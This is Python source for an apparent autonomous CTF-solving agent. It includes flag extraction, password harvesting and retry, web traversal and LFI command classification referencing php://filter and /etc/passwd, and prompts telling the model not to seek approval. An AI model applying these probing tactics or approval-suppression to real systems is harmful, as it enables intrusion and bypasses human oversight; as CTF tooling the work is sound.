        # Newer reasoning models (e.g., o1/o3/gpt-5) use max_completion_tokens.
        model = (model_name or self.model or "").lower()
        if model.startswith(("o1", "o3", "gpt-5")):
            return {"max_completion_tokens": max_tokens}
        return {"max_tokens": max_tokens}

    def _truncate_for_context(self, text: str) -> str:
        if not text:
            return "(no output)"
        if len(text) <= self.tool_context_limit:
            return text
        return text[:self.tool_context_limit] + "\n...[truncated]..."

    def _is_error_result(self, text: str) -> bool:
        if not text:
            return False
        return bool(re.search(
            r"\[tool error\]|\[exec error:|Traceback|ModuleNotFoundError|No such file or directory|command not found|\berror:|\[error\]",
            text,
            re.IGNORECASE,
        ))

    def _flag_matches_format(self, flag: str) -> bool:
        fmt = self.flag_format
        if not fmt:
            return True
        try:
            if re.search(fmt, flag):
                return True
        except re.error:
            pass
        return flag.startswith(fmt) or flag == fmt

    def _extract_flag_candidates(self, text: str) -> list[str]:
        if not text:
            return []
        candidates = []
        seen = set()
        variants = [text]
        escaped = _decode_backslash_escapes(text)
        if escaped != text:
            variants.append(escaped)

        def add_candidate(v: str):
            vv = (v or "").strip()
            if not vv or vv in seen:
                return
            if not _is_plausible_flag_token(vv):
                return
            seen.add(vv)
            candidates.append(vv)

        for blob in variants:
            # Direct flag-like tokens.
            for m in re.finditer(r"\b[a-zA-Z0-9_]{2,24}\{[^{}\n]{1,220}\}", blob):
                add_candidate(m.group(0))

            # Decode base64-like tokens and re-scan for flag-like strings.
            for m in re.finditer(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{16,}={0,2}(?![A-Za-z0-9+/])", blob):
                tok = m.group(0)
                try:
                    decoded = base64.b64decode(tok, validate=True).decode("utf-8", errors="ignore")
                except Exception:
                    continue
                for fm in re.finditer(r"\b[a-zA-Z0-9_]{2,24}\{[^{}\n]{1,220}\}", decoded):
                    add_candidate(fm.group(0))

        return candidates

    def _command_family(self, cmd: str) -> str:
        c = (cmd or "").strip()
        if not c:
            return "unknown"
        first = re.split(r"[;\n|&]+", c, 1)[0].strip()
        token = first.split()[0] if first else ""
        t = (token or "").lower()
        low = first.lower()

        # Use semantic command families for web work so anti-loop budgets trigger on
        # tactic repetition, not just exact command text.
        if self.category == "web":
            if t in {"ffuf", "gobuster", "feroxbuster", "dirsearch"}:
                return "web:fuzz"
            if t == "sqlmap":
                return "web:sqli-auto"
            if t == "curl":
                if re.search(r"/upload|upload\.php|-f\s+|--form|multipart/form-data|image=@", low):
                    return "web:upload-check"
                if "php://filter" in low or "../" in low or "%2e%2e" in low:
                    return "web:traversal-check"
                if re.search(r"\?(?:file|page|path|include|inc|template|view|img|image|src|doc|name)=", low):
                    return "web:lfi-check"
                if re.search(r"/robots\.txt|/sitemap\.xml|/\.git/|/admin\b|/api\b", low):
                    return "web:recon-endpoints"
                return "web:curl-generic"
            if t in {"python", "python3"} and ("http://" in low or "https://" in low or "requests" in low):
                return "web:http-script"
        return t or "unknown"

    def _hypothesis_key(self, reasoning: str, family: str, cmd: str) -> str:
        # For web, bind hypothesis budgets to tactic families to prevent endpoint/param
        # spray from escaping budget checks via tiny reasoning text changes.
        if self.category == "web":
            return family or self._command_family(cmd)
        r = re.sub(r"\s+", " ", (reasoning or "").strip().lower())
        if r:
            r = re.sub(r"[^a-z0-9 _-]", "", r)
            return (r[:80] or family or "unknown")
        return family or self._command_family(cmd)

    def _fingerprint_output(self, text: str) -> str:
        if not text:
            return ""
        s = text
        if self.category == "web":
            # Normalize volatile HTTP headers so repeated default pages collapse to the
            # same fingerprint and are counted as non-progress.
            s = re.sub(r"(?im)^Date:\s+.*$", "Date:<redacted>", s)
            s = re.sub(r"(?im)^ETag:\s+.*$", "ETag:<redacted>", s)
            s = re.sub(r"(?im)^Last-Modified:\s+.*$", "Last-Modified:<redacted>", s)
            s = re.sub(r"(?im)^Content-Length:\s+\d+$", "Content-Length:<n>", s)
        # Normalize whitespace and noise while preserving semantic differences.
        s = re.sub(r"\s+", " ", s.strip())
        return s[:600]

    def _score_progress(self, output: str) -> bool:
        out = output or ""
        if not out.strip():
            return False
        if self._extract_flag_candidates(out):
            return True
        if self._is_error_result(out):
            return False
        fp = self._fingerprint_output(out)
        if not fp:
            return False
        if self.category == "web":
            low_signal_web = bool(re.search(
                r"HTTP/\d(?:\.\d)?\s+404\b|HTTP/\d(?:\.\d)?\s+403\b|"
                r"<title>\s*404\s+Not\s+Found\s*</title>|"
                r"<title>\s*403\s+Forbidden\s*</title>|"
                r"The requested URL was not found on this server|"
                r"You don't have permission to access this resource",
                out,
                re.IGNORECASE,
            ))
            has_high_value_web_signal = bool(re.search(
                r"Successfully uploaded|Access it at:|Set-Cookie:|Location:|"
                r"Content-Disposition:|multipart/form-data|php://filter|"
                r"root:x:|/etc/passwd|flag\{|picoctf\{|include\(",
                out,
                re.IGNORECASE,
            ))
            # Treat default 404/403 style responses as no progress unless they carry
            # a concrete exploit signal.
            if low_signal_web and not has_high_value_web_signal:
                self._seen_output_fingerprints.add(fp)
                return False
        if fp in self._seen_output_fingerprints:
            return False
        self._seen_output_fingerprints.add(fp)
        return True

    def _recursive_decode_strings(self, text: str, max_rounds: int = 4) -> list[str]:
        """Recursively decode base64 and hex tokens, following encoding chains.
        Returns all intermediate and final decoded strings in order."""
        out = []
        seen = set()
        queue = [text or ""]
        rounds = 0
        while queue and rounds < max_rounds:
            rounds += 1
            cur = queue.pop(0)
            if not cur or cur in seen:
                continue
            seen.add(cur)
            out.append(cur)
            unescaped = _decode_backslash_escapes(cur)
            if unescaped and unescaped not in seen and unescaped != cur:
                queue.append(unescaped)
            # Base64-looking tokens (≥8 chars, valid b64 alphabet).
            # Note: trailing `\b` breaks when the token ends with `=` (non-word char),
            # so we use a negative lookahead instead.
            for m in re.finditer(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{8,}={0,2}(?![A-Za-z0-9+/])", cur):
                tok = m.group(0)
                try:
                    dec = base64.b64decode(tok, validate=True).decode("utf-8", errors="ignore")
                except Exception:
                    continue
                if dec and dec not in seen:
                    queue.append(dec)
            # Also try decoding the entire string as base64 (for when the whole value is encoded).
            stripped = (cur or "").strip()
            if stripped and stripped not in seen and len(stripped) >= 8:
                try:
                    whole = base64.b64decode(stripped + "==", validate=False).decode("utf-8", errors="ignore")
                    if whole and whole.isprintable() and whole not in seen and whole != stripped:
                        queue.append(whole)
                except Exception:
                    pass
            # Hex strings: 0x prefixed or even-length hex sequences.
            for m in re.finditer(r"(?:0x)?([0-9a-fA-F]{16,})", cur):
                tok = m.group(1)
                if len(tok) % 2 == 0:
                    try:
                        dec = bytes.fromhex(tok).decode("utf-8", errors="ignore")
                        if dec and dec.isprintable() and dec not in seen:
                            queue.append(dec)
                    except Exception:
                        pass
        return out

    def _store_hint(self, key: str, value: str):
        k = (key or "").strip().lower()
        v = (value or "").strip()
        if not k or not v:
            return
        vals = {v}
        # Keep recursively decoded variants so tool:value hints become actionable.
        for dec in self._recursive_decode_strings(v, max_rounds=3):
            d = (dec or "").strip()
            if d:
                vals.add(d)
        self._hint_map.setdefault(k, set()).update(vals)

    # Tools whose name appearing as a key in "tool:value" output constitutes an immediate directive.
    _DIRECTIVE_TOOLS = {
        "steghide", "john", "hashcat", "openssl", "gpg", "zip", "unzip",
        "7z", "ssh", "ftp", "mysql", "password", "pass", "passphrase", "key", "secret",
    }

    def _harvest_action_hints(self, output: str):
        text = output or ""
        if not text:
            return
        decoded_pool = self._recursive_decode_strings(text, max_rounds=4)
        for blob in decoded_pool:
            # Generic key:value hints (tool/password/token/etc.).
            for m in re.finditer(r"\b([a-zA-Z][a-zA-Z0-9_.-]{1,20})\s*:\s*([^\s]{2,120})", blob):
                key = m.group(1)
                val = m.group(2)
                self._store_hint(key, val)
                # If it looks like a tool directive, inject an urgent message into the conversation.
                if key.lower() in self._DIRECTIVE_TOOLS:
                    self._inject_directive(key, val, source="metadata/output")
            # Password-like mentions.
            for m in re.finditer(r"(?i)\b(?:password|pass|pwd|key|passphrase)\b\s*[=:]\s*([^\s]{2,120})", blob):
                self._store_hint("password", m.group(1))
                self._inject_directive("password", m.group(1), source="metadata/output")

    # Common English words / error-message fragments that should never be treated as credentials.
    _DIRECTIVE_BLOCKLIST = frozenset({
        "could", "not", "error", "failed", "invalid", "none", "null", "true", "false",
        "data", "that", "with", "this", "from", "file", "path", "name", "type",
        "any", "the", "and", "for", "have", "been", "will", "more", "into", "any",
        "extract", "passphrase", "using", "write", "read", "open", "close",
    })

    def _inject_directive(self, tool: str, raw_value: str, source: str = ""):
        """Queue an urgent user message when a tool:value directive is decoded from output.

        IMPORTANT: messages are placed on _pending_directive_messages, NOT directly into
        self.messages.  They are flushed by _run() AFTER the complete tool-response loop
        finishes, so the OpenAI message ordering constraint (assistant tool_calls → tool
        responses) is never violated.
        """
        if not self.running:
            return

        # Reject short / common English word values — these are almost always false positives
        # from error messages like "steghide: could not extract any data with that passphrase!"
        stripped = (raw_value or "").strip()
        if len(stripped) < 5 or stripped.lower() in self._DIRECTIVE_BLOCKLIST:
            return
        # Also reject values that look like natural-language sentences (contain spaces).
        if " " in stripped:
            return

        # Fully decode the credential by following base64 / hex chains.
        decoded_chain = self._recursive_decode_strings(stripped, max_rounds=4)
        # Pick the last fully-decoded, printable value that is not another tool:value pair.
        resolved = stripped
        for d in decoded_chain:
            d = (d or "").strip()
            if (d and 4 <= len(d) <= 200 and "\n" not in d
                    and ":" not in d          # avoid accepting "steghide:base64" as the password
                    and d.lower() not in self._DIRECTIVE_BLOCKLIST):
                resolved = d

        # Deduplicate — don't inject the same directive twice.
        inject_key = f"{tool.lower()}:{resolved}"
        if inject_key in self._hint_injected:
            return
        self._hint_injected.add(inject_key)

        decode_note = f" (base64-decoded from '{stripped[:60]}')" if resolved != stripped else ""
        msg = (
            f"[URGENT DIRECTIVE from {source}] "
            f"Decoded directive: tool='{tool}', credential='{resolved}'{decode_note}. "
            f"STOP current exploration. Use '{tool}' with credential '{resolved}' on the relevant "
            f"file in /ctf/ RIGHT NOW. Do not run binwalk, zsteg, strings, or other exploratory "
            f"commands first. This directive was encoded in the artifact's metadata and is the "
            f"highest-probability path to the flag."
        )
        # ── Deferred injection ──────────────────────────────────────────────────
        # Appending directly to self.messages here would insert a 'user' message
        # between an 'assistant tool_calls' entry and its 'tool' response, which
        # OpenAI rejects with a 400 error.  Instead we queue it; _run() flushes
        # the queue after ALL tool responses for the current step are appended.
        self._pending_directive_messages.append({"role": "user", "content": msg})
        self.emit("thought", {"text": msg, "type": "system"})

    def _try_hint_actions(self) -> bool:
        if self._running_hint_action or not self.running:
            return False
        passwords = set()
        passwords |= self._hint_map.get("password", set())
        passwords |= self._hint_map.get("pass", set())
        passwords |= self._hint_map.get("pwd", set())
        passwords |= self._hint_map.get("key", set())
        passwords |= self._hint_map.get("passphrase", set())
        if "steghide" in self._hint_map:
            passwords |= self._hint_map.get("steghide", set())
        # Expand with recursively decoded variants for layered encodings.
        expanded = set(passwords)
        for p in list(passwords):
            for dec in self._recursive_decode_strings(p, max_rounds=3):
                d = (dec or "").strip()
                if d and d != p:
                    expanded.add(d)
        passwords = expanded
        # Remove non-password-y tokens.
        passwords = {p for p in passwords if 2 <= len(p) <= 120 and ":" not in p and "\n" not in p}
        if not passwords:
            return False

        self._running_hint_action = True
        try:
            listing = self.container.run("find /ctf -maxdepth 2 -type f | sort")
            files = [ln.strip() for ln in (listing or "").splitlines() if ln.strip()]
            any_progress = False

            # Resolve all passwords: base64-encoded values are fully decoded before use.
            resolved_passwords = set()
            for pw in passwords:
                resolved_passwords.add(pw)  # always keep original
                if re.fullmatch(r'[A-Za-z0-9+/]{8,}={0,2}', pw):
                    # Looks like base64 — fully decode and add the plaintext form.
                    for d in self._recursive_decode_strings(pw, max_rounds=4):
                        d = (d or "").strip()
                        if (d and d != pw and 2 <= len(d) <= 120
                                and ":" not in d and "\n" not in d
                                and d.lower() not in self._DIRECTIVE_BLOCKLIST):
                            try:
                                d.encode("ascii")
                                resolved_passwords.add(d)
                            except Exception:
                                pass
            passwords = resolved_passwords

            def _check_flag(out: str, source: str) -> bool:
                """Flag-only check used inside hint actions.
                Deliberately does NOT call _harvest_action_hints so that tool error
                messages (e.g. 'steghide: could not extract...') don't generate false
                directive injections."""
                if not out or not self.running:
                    return False
                candidates = self._extract_flag_candidates(out)
                if not candidates:
                    return False
                chosen = candidates[0]
                if self.flag_format and not self._flag_matches_format(chosen):
                    return False
                update_challenge(self.cid, status="solved", flag=chosen)
                self.emit("thought", {"text": f"Hint-action flag: {chosen}", "type": "system"})
                self.emit("flag", {"flag": chosen, "how": source})
                self.emit("done", {"status": "solved"})
                self.running = False
                return True

            # ── Steghide: JPG/BMP/WAV/AU carriers ────────────────────────────────
            carriers = [f for f in files if re.search(r"\.(jpg|jpeg|bmp|wav|au)$", f, re.IGNORECASE)]
            for carrier in carriers[:10]:
                for pw in sorted(resolved_passwords)[:30]:
                    key = ("steghide", carrier, pw)
                    if key in self._hint_attempted:
                        continue
                    self._hint_attempted.add(key)
                    self.emit("thought", {"text": f"Hint-driven: steghide on {carrier} credential='{pw[:20]}'.", "type": "system"})
                    out = self.container.run(
                        f"steghide extract -sf {_shell_quote(carrier)} -p {_shell_quote(pw)} -f 2>&1",
                        timeout=60,
                    )
                    self.emit("output", {"text": out})
                    if _check_flag(out, source=f"steghide:{carrier}"):
                        return True
                    if out and re.search(r"wrote extracted data to|extracted", out, re.IGNORECASE):
                        any_progress = True
                        scan = self.container.run(
                            "grep -rE '[A-Za-z0-9_]{2,24}\\{[^{}\\n]{1,220}\\}' /ctf 2>/dev/null | head -40",
                            timeout=60,
                        )
                        self.emit("output", {"text": scan})
                        if _check_flag(scan, source="post-steghide-scan"):
                            return True

            # ── ZIP archives ──────────────────────────────────────────────────────
            zip_files = [f for f in files if re.search(r"\.(zip)$", f, re.IGNORECASE)]
            for zf in zip_files[:5]:
                for pw in sorted(resolved_passwords)[:30]:
                    key = ("zip", zf, pw)
                    if key in self._hint_attempted:
                        continue
                    self._hint_attempted.add(key)
                    self.emit("thought", {"text": f"Hint-driven: unzip {zf} credential='{pw[:20]}'.", "type": "system"})
                    out = self.container.run(
                        f"unzip -P {_shell_quote(pw)} -o {_shell_quote(zf)} -d /ctf/zip_extracted/ 2>&1",
                        timeout=60,
                    )
                    self.emit("output", {"text": out})
                    if _check_flag(out, source=f"zip:{zf}"):
                        return True
                    if out and re.search(r"inflating|extracting", out, re.IGNORECASE):
                        any_progress = True
                        scan = self.container.run(
                            "grep -rE '[A-Za-z0-9_]{2,24}\\{[^{}\\n]{1,220}\\}' /ctf/zip_extracted/ 2>/dev/null | head -40",
                            timeout=60,
                        )
                        self.emit("output", {"text": scan})
                        if _check_flag(scan, source="post-zip-scan"):
                            return True

            # ── OpenSSL encrypted files ───────────────────────────────────────────
            enc_files = [f for f in files if re.search(r"\.(enc|aes|des|crypt)$", f, re.IGNORECASE)]
            for ef in enc_files[:5]:
                for pw in sorted(resolved_passwords)[:15]:
                    key = ("openssl", ef, pw)
                    if key in self._hint_attempted:
                        continue
                    self._hint_attempted.add(key)
                    self.emit("thought", {"text": f"Hint-driven: openssl decrypt {ef}.", "type": "system"})
                    out_path = ef + ".dec"
                    out = self.container.run(
                        f"openssl enc -d -aes-256-cbc -pbkdf2 -pass pass:{_shell_quote(pw)} -in {_shell_quote(ef)} -out {_shell_quote(out_path)} 2>&1 && strings {_shell_quote(out_path)} | head -20",
                        timeout=30,
                    )
                    self.emit("output", {"text": out})
                    if _check_flag(out, source=f"openssl:{ef}"):
                        return True
                    if out and not re.search(r"error|bad decrypt|wrong", out, re.IGNORECASE):
                        any_progress = True

            return any_progress
        finally:
            self._running_hint_action = False

    def _normalize_command(self, cmd: str) -> str:
        return re.sub(r"\s+", " ", (cmd or "").strip())

    def _is_repeated_command(self, cmd: str) -> bool:
        if not cmd:
            return False
        # Block exact repeats after one prior attempt; keeps turns high-signal.
        if sum(1 for c in self._recent_cmds if c == cmd) < 1:
            return False
        # Allow repeats if the last run errored (likely fix-and-retry).
        status = self._last_cmd_status.get(cmd)
        if status and status.get("error"):
            return False
        return True

    def _parse_tool_args(self, raw: str) -> tuple[dict, str | None]:
        """Best-effort tool args parser. Returns (args, error_message_or_None)."""
        if raw is None:
            return {}, "empty arguments"
        if isinstance(raw, dict):
            return raw, None
        s = (raw or "").strip()
        if not s:
            return {}, "empty arguments"
        # First try strict JSON.
        try:
            return json.loads(s), None
        except Exception:
            pass
        # Try to extract the first JSON object from noisy strings.
        try:
            start = s.find("{")
            end = s.rfind("}")
            if start != -1 and end != -1 and end > start:
                return json.loads(s[start:end + 1]), None
        except Exception:
            pass
        # Try Python literal dict with single quotes.
        try:
            import ast
            val = ast.literal_eval(s)
            if isinstance(val, dict):
                return val, None
        except Exception:
            pass
        return {}, "invalid JSON arguments"

    def _record_command(self, cmd: str):
        if cmd:
            self._recent_cmds.append(cmd)

    def _extract_missing_command(self, output: str) -> str:
        if not output:
            return ""
        patterns = [
            r"bash:\s*line\s*\d+:\s*([a-zA-Z0-9_.+-]+):\s*command not found",
            r"/bin/sh:\s*\d+:\s*([a-zA-Z0-9_.+-]+):\s*not found",
            r"([a-zA-Z0-9_.+-]+):\s*command not found",
        ]
        for pat in patterns:
            m = re.search(pat, output, re.IGNORECASE)
            if m:
                return (m.group(1) or "").strip()
        return ""

    def _maybe_install_and_retry_missing_tool(self, tool: str, cmd_to_run: str, timeout: int) -> str | None:
        if not self.allow_runtime_installs:
            return None
        tool = (tool or "").strip()
        if not tool or tool in self._install_attempted_tools:
            return None
        self._install_attempted_tools.add(tool)

        installer = SYSTEM_TOOL_INSTALLERS.get(tool)
        if not installer:
            if not re.match(r"^[a-zA-Z0-9][a-zA-Z0-9+_.-]{0,63}$", tool):
                return None
            installer = f"DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends {tool}"

        self.emit("thought", {"text": f"Missing tool '{tool}'. Installing from internet and retrying once.", "type": "system"})
        self.container.run("apt-get update -y >/dev/null 2>&1 || true", timeout=120)
        self.container.run(installer + " >/dev/null 2>&1 || true", timeout=180)
        self.emit("command", {"cmd": f"[retry after install] {tool}"})
        return self.container.run(cmd_to_run, timeout=timeout)

    def _ensure_tooling_ready(self):
        if self._tool_preflight_done or not self.running:
            return
        self._tool_preflight_done = True
        checks = CATEGORY_TOOL_CHECKS.get(self.category, [])
        if not checks:
            return

        missing = []
        missing_custom = []
        for tool in checks:
            out = self.container.run(f"command -v {tool} >/dev/null 2>&1 && echo OK || echo MISSING")
            if "MISSING" in out:
                if tool in TOOL_INSTALL_COMMANDS:
                    missing_custom.append(tool)
                else:
                    missing.append(tool)

        if (missing or missing_custom) and not self.allow_runtime_installs:
            all_missing = sorted(set(missing + missing_custom))
            self._preflight_missing_tools = all_missing
            self.emit("thought", {
                "text": "Tool preflight: missing tools detected but runtime installs are disabled by policy: "
                        + ", ".join(all_missing),
                "type": "system",
            })
            return
        self._preflight_missing_tools = []

        if missing:
            pkgs = sorted({TOOL_APT_PACKAGES.get(t, t) for t in missing})
            self.emit("thought", {"text": f"Tool preflight: installing missing tools: {', '.join(pkgs)}", "type": "system"})
            self.container.run("apt-get update -y >/dev/null 2>&1 || true", timeout=120)
            self.container.run(
                "DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends "
                + " ".join(_shell_quote(p) for p in pkgs)
                + " >/dev/null 2>&1 || true",
                timeout=180,
            )
        for tool in missing_custom:
            self.emit("thought", {"text": f"Tool preflight: installing {tool}", "type": "system"})
            self.container.run(TOOL_INSTALL_COMMANDS[tool] + " >/dev/null 2>&1 || true", timeout=180)

        # Binwalk frequently breaks due to capstone ABI mismatch; self-heal if detected.
        if "binwalk" in checks:
            probe = self.container.run(
                "python3 - <<'PY'\n"
                "import capstone\n"
                "print('OK' if hasattr(capstone, 'CS_ARCH_ARM64') else 'BAD')\n"
                "PY"
            )
            if "BAD" in (probe or ""):
                self.emit("thought", {"text": "Tool preflight: repairing capstone compatibility for binwalk.", "type": "system"})
                self.container.run(
                    "python3 -m pip -q install --break-system-packages --ignore-installed 'capstone<6' || true",
                    timeout=120,
                )

    def _maybe_auto_submit_from_output(self, output: str, source: str = "") -> bool:
        if not self.running:
            return False
        self._harvest_action_hints(output or "")
        candidates = self._extract_flag_candidates(output or "")
        if not candidates:
            return False

        src_key = (source or "tool").split(":", 1)[0].strip() or "tool"
        text = output or ""
        for c in candidates:
            self._flag_evidence.setdefault(c, set()).add(src_key)

        chosen = None
        if self.flag_format:
            for c in candidates:
                if self._flag_matches_format(c):
                    chosen = c
                    break
            if not chosen:
                return False
        else:
            if not self.strict_auto_submit:
                chosen = candidates[0]
            else:
                for c in candidates:
                    prefix = c.split("{", 1)[0]
                    evidence_sources = self._flag_evidence.get(c, set())
                    if _prefix_looks_ctf_like(prefix) and (
                        src_key == "search_flag"
                        or text.count(c) >= 2
                        or len(evidence_sources) >= 2
                    ):
                        chosen = c
                        break
                    # For unknown prefixes require strong corroboration across sources.
                    if text.count(c) >= 2 and len(evidence_sources) >= 2:
                        chosen = c
                        break
                if not chosen:
                    preview = ", ".join(candidates[:3])
                    self.emit("thought", {
                        "text": f"Low-confidence flag-like token(s) detected, not auto-submitting: {preview}",
                        "type": "system",
                    })
                    return False

        how = f"Auto-detected in {source or 'tool output'}"
        update_challenge(self.cid, status="solved", flag=chosen)
        self.emit("thought", {"text": f"Auto-detected flag candidate: {chosen}", "type": "system"})
        self.emit("flag", {"flag": chosen, "how": how})
        self.emit("done", {"status": "solved"})
        self.running = False
        return True

    def _sanitize_messages(self, messages: list[dict]) -> list[dict]:
        # Ensure tool role messages only appear after a matching assistant tool_calls message.
        out = []
        expected_tool_ids = set()
        for m in messages:
            role = m.get("role")
            if role == "assistant" and m.get("tool_calls"):
                expected_tool_ids = {tc.get("id") for tc in m.get("tool_calls", []) if tc.get("id")}
                out.append(m)
                continue
            if role == "tool":
                if expected_tool_ids and m.get("tool_call_id") in expected_tool_ids:
                    out.append(m)
                # else drop orphan tool message
                continue
            # normal user/assistant/system
            expected_tool_ids = set()
            out.append(m)
        return out

    def _prune_dangling_tool_calls(self):
        # Keep only complete assistant(tool_calls) -> tool(response...) blocks.
        src = self.messages
        pruned = []
        i = 0
        n = len(src)
        while i < n:
            m = src[i]
            if m.get("role") == "assistant" and m.get("tool_calls"):
                expected = {tc.get("id") for tc in m.get("tool_calls", []) if tc.get("id")}
                j = i + 1
                block_tools = []
                seen = set()
                while j < n and src[j].get("role") == "tool":
                    t = src[j]
                    tcid = t.get("tool_call_id")
                    if tcid in expected and tcid not in seen:
                        block_tools.append(t)
                        seen.add(tcid)
                    j += 1
                # Keep the block only if every tool_call_id has a matching tool response.
                if expected and seen == expected:
                    pruned.append(m)
                    pruned.extend(block_tools)
                i = j
                continue
            # Drop orphan tool messages outright.
            if m.get("role") == "tool":
                i += 1
                continue
            pruned.append(m)
            i += 1
        self.messages = pruned

    def _emit_stream_delta(self, stream_id: str, text: str, msg_type: str):
        self.emit("thought_stream_delta", {"id": stream_id, "text": text, "type": msg_type})

    def _call(self, force_text=False):
        # Always prune dangling tool_calls before sending to API.
        self._prune_dangling_tool_calls()
        msg_list = self._sanitize_messages(self.messages)
        kwargs = dict(
            model=self.model,
            **self._token_limit_kw(4096),
            messages=[{"role": "system", "content": self._system_prompt()}] + msg_list,
            stream=True,
            stream_options={"include_usage": True},
        )
        if not force_text:
            kwargs["tools"] = CTF_TOOLS
            kwargs["tool_choice"] = "auto"

        stream = self.client.chat.completions.create(**kwargs)
        content_parts = []
        tool_calls = {}
        usage = None
        stream_id = uuid.uuid4().hex
        msg_type = "reasoning"
        started = False

        for chunk in stream:
            if not self.running:
                try:
                    stream.close()
                except Exception:
                    pass
                break
            if getattr(chunk, "usage", None):
                usage = chunk.usage
            if not chunk.choices:
                continue
            delta = chunk.choices[0].delta
            if not delta:
                continue
            if getattr(delta, "content", None):
                if not started:
                    self.emit("thought_stream_start", {"id": stream_id, "type": msg_type})
                    started = True
                text = delta.content
                content_parts.append(text)
                self._emit_stream_delta(stream_id, text, msg_type)
            if getattr(delta, "tool_calls", None):
                for tc in delta.tool_calls:
                    idx = tc.index
                    if idx not in tool_calls:
                        tool_calls[idx] = {"id": tc.id, "type": tc.type, "function": {"name": "", "arguments": ""}}
                    if tc.id:
                        tool_calls[idx]["id"] = tc.id
                    if tc.function:
                        if tc.function.name:
                            tool_calls[idx]["function"]["name"] = tc.function.name
                        if tc.function.arguments:
                            tool_calls[idx]["function"]["arguments"] += tc.function.arguments

        if started:
            self.emit("thought_stream_end", {"id": stream_id})

        if usage:
            self.total_in  += usage.prompt_tokens
            self.total_out += usage.completion_tokens
            _, rates = resolve_model_rates(self.model, load_config())
            if rates:
                ir, or_ = rates
                cost = (self.total_in * ir + self.total_out * or_) / 1_000_000
                update_challenge(self.cid, cost_usd=cost, tokens_in=self.total_in, tokens_out=self.total_out)
                payload = {
                    "cost": f"${cost:.4f}",
                    "cost_usd": cost,
                    "tokens_in": self.total_in,
                    "tokens_out": self.total_out,
                    "model": self.model,
                    "known": True,
                }
            else:
                update_challenge(self.cid, tokens_in=self.total_in, tokens_out=self.total_out)
                payload = {
                    "cost": "—",
                    "cost_usd": None,
                    "tokens_in": self.total_in,
                    "tokens_out": self.total_out,
                    "model": self.model,
                    "known": False,
                }
            self.emit("cost", payload)

        content = "".join(content_parts) if content_parts else None
        tc_objs = None
        tc_raw = None
        if tool_calls:
            ordered = [tool_calls[i] for i in sorted(tool_calls.keys())]
            tc_objs = []
            tc_raw = []
            for t in ordered:
                fn = SimpleNamespace(name=t["function"]["name"], arguments=t["function"]["arguments"])
                tc_objs.append(SimpleNamespace(id=t["id"], type=t.get("type", "function"), function=fn))
                tc_raw.append({
                    "id": t["id"],
                    "type": t.get("type", "function"),
                    "function": {
                        "name": t["function"]["name"],
                        "arguments": t["function"]["arguments"],
                    },
                })

        return SimpleNamespace(content=content, tool_calls=tc_objs, tool_calls_raw=tc_raw)

    def _summarize(self):
        self.emit("thought", {"text": "── Summarizing context ──", "type": "system"})
        try:
            # Avoid tool messages in the summary prompt to prevent invalid tool-call pairing.
            tail = [m for m in self.messages[-12:] if m.get("role") != "tool"]
            summary_model = "gpt-4o-mini"
            r = self.client.chat.completions.create(
                model=summary_model, **self._token_limit_kw(400, model_name=summary_model),
                messages=[{"role": "user", "content":
                    "Summarize this CTF session: files found, tried, failed, theory, next steps.\n\n"
                    + json.dumps(tail, indent=2)}]
            )
            summary = r.choices[0].message.content or ""
            # Keep only summary + last few non-tool messages to avoid invalid tool history.
            tail2 = [m for m in self.messages[-3:] if m.get("role") != "tool"]
            self.messages = self.messages[:2] + [
                {"role": "user", "content": f"[SESSION SUMMARY]\n{summary}"}
            ] + tail2
        except:
            pass

    def _save_retry_summary(self):
        try:
            summary_model = "gpt-4o-mini"
            r = self.client.chat.completions.create(
                model=summary_model, **self._token_limit_kw(500, model_name=summary_model),
                messages=[{"role": "user", "content":
                    "Summarize this FAILED CTF attempt for a retry: files, tried, failed, unexplored, next approach.\n\n"
                    + json.dumps(self.messages[-20:], indent=2)}]
            )
            update_challenge(self.cid, retry_summary=r.choices[0].message.content)
        except:
            pass

    def _run(self, challenge_desc, prior_summary):
        # Auto recon
        recon = self.container.run("ls -la /ctf/ && echo '---' && file /ctf/* 2>/dev/null")
        self.emit("output", {"text": f"[auto-recon]\n{recon}"})
        self._update_evidence_from_output("auto-recon", recon)
        self._ensure_tooling_ready()
        if self._run_forensics_fastpath(recon):
            return

        prior_ctx = f"\n\n[PRIOR ATTEMPT]\n{prior_summary}" if prior_summary else ""
        tooling_ctx = ""
        if self._preflight_missing_tools:
            tooling_ctx = (
                "\n\n[TOOLING CONSTRAINT]\nRuntime installs are disabled. "
                "The following tools are currently unavailable and must not be used in the plan: "
                + ", ".join(self._preflight_missing_tools)
                + ". Use alternatives that are already installed."
            )
        playbook_ctx = self._forensics_playbook_hint(recon)
        web_ctx = ""
        if self.category == "web":
            web_ctx = (
                "\n[MANDATORY WEB DECISION TREE]\n"
                "1) Upload primitive validation.\n"
                "2) Execution path check.\n"
                "3) Include/LFI checks on high-probability params.\n"
                "4) Bounded endpoint fuzzing only after 1-3 fail.\n"
                "Repeated default 404/403 or same-body responses are non-progress.\n"
            )
        initial = (
            f"{challenge_desc}\n\nFiles in container:\n{recon}{prior_ctx}{tooling_ctx}{playbook_ctx}{web_ctx}\n\n"
            f"{self._evidence_summary()}\n"
            "Execution policy:\n"
            "- Use exactly one decisive tool call per turn.\n"
            "- Do not ask for approval; execute autonomously.\n"
            "- Prefer proving or falsifying a hypothesis in one action.\n"
            "- If a hypothesis fails twice, pivot to a different hypothesis class.\n"
            "- For WEB category, strictly follow: upload validation -> execution path -> include/LFI -> bounded fuzzing.\n"
            "Now execute the best next action with one tool call."
        )
        self.messages.append({"role": "user", "content": initial})

        max_steps = STEP_LIMITS.get(self.category, 40)
        consecutive_errors = 0
        last_evidence_version = self._evidence_version
        for self.step in range(max_steps):
            if not self.running:
                break

            if self.step > 0 and self.step % 15 == 0:
                self._summarize()

            try:
                msg = self._call()
            except Exception as e:
                self.emit("thought", {"text": f"API error: {e}", "type": "error"})
                self.emit("error", {"message": f"API error: {e}"})
                self._prune_dangling_tool_calls()
                break

            if msg.content:
                self.emit("thought", {"text": msg.content, "type": "reasoning"})
                if _is_approval_seeking_text(msg.content):
                    self.messages.append({"role": "assistant", "content": msg.content or ""})
                    self.messages.append({"role": "user", "content":
                        "Do not ask for approval. Choose the best next decisive action and execute it now with one tool call."
                    })
                    continue

            if not msg.tool_calls:
                self.messages.append({"role": "assistant", "content": msg.content or ""})
                self.messages.append({"role": "user", "content":
                    "Use exactly one decisive tool call now. No additional planning text."
                })
                continue

